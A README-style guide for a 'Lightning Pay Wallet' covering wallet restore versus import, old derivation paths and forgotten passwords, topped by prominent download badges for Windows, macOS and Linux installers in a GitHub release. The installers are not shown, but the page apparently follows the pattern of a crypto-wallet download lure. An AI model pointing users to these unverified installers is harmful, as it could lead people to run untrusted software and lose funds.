<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Recovering an old bitcoin wallet, or importing one you already have
Old backups, forgotten passwords and the difference between importing and restoring.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Two situations look similar and are not: bringing back a wallet you once had, and bringing an existing
wallet into this application. The first is recovery from a backup; the second is an import, and it
depends on what the old wallet exported.

## Import versus restore

A restore rebuilds a wallet from a seed phrase. An import loads something a wallet exported: a private
key, a watch-only descriptor, or a wallet file. A seed phrase is not an import; a private key is not a
seed phrase. Mixing the two is the most common reason an old wallet "will not come back".

## Recovering an old wallet

Start with what you still have. If it is a phrase, the procedure in
[recover a bitcoin wallet with a seed phrase](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-a-bitcoin-wallet-with-a-seed-phrase.md)
applies. If it is a file from an old application, the file is only useful to software that understands
its format, which may not be this wallet.

Old wallets can also predate the current standard for deriving addresses, so a restore may show an
empty balance until the wallet is told to scan the older derivation paths. That scan takes time and it
is the reason a restore can look broken for an hour and then produce the funds.

## Forgotten passwords

A password on a wallet file encrypts the file; it does not encrypt the bitcoin. With the seed phrase,
the password is irrelevant: restore and set a new one. Without the phrase, the password is the only
way in, and no support process can bypass it.

That is worth stating plainly because recovery-tool offers exist and most are either useless or
hostile. A tool that asks for your phrase to "restore" it is a theft attempt.

## When the old device still works

If the old machine or phone still opens the wallet, use it to export a key or a phrase before doing
anything else, and move the funds to a fresh wallet rather than trying to modernise the old one.
Working access is worth more than any recovery procedure.

## Questions people ask

### Can I import a wallet from another app?

Sometimes: if the other app exports a private key or a standard descriptor. A phrase from another
wallet is a restore, not an import.

### Why does the restore show an empty balance?

Either the sync has not finished, or the old addresses use a derivation path the wallet has not scanned
yet. Let the scan complete before concluding anything.

### I forgot the password. Can support reset it?

No. There is no account and no server. The phrase is the way back; without it the password stands.
